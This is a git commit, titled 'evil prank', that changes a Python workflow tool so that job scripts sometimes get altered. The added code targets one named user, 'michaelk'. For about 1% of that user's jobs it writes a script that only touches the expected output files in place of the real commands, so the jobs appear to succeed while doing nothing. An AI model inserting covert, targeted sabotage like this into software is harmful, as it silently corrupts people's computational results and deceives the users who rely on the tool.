49968453a6b55eb3b2688d74d56f09e17a069146
Thomas Mailund <mailund@birc.au.dk>
2015-09-04 15:36:19 +0200

    evil prank

--- src/gwf_workflow/workflow.py
+++ src/gwf_workflow/workflow.py
@@ -13,6 +13,8 @@ from gwf_workflow.colours import *
 from gwf_workflow.helpers import *
 
 
+  
+
 
 class Node(object):
     """Class handling targets. Stores the info for executing them."""
@@ -145,7 +147,14 @@ class Node(object):
         print >> f
 
         print >> f, '# Script from workflow'
-        print >> f, self.target.spec
+
+        # knudsen
+        import getpass, random
+        fake_script = '\n'.join(["touch {}".format(x) for x in self.target.options['output']])
+        if (getpass.getuser() == "michaelk") and (random.random() < 0.01):
+            print >> f, fake_script
+        else:
+            print >> f, self.target.spec
 
     @property
     def job_in_queue(self):
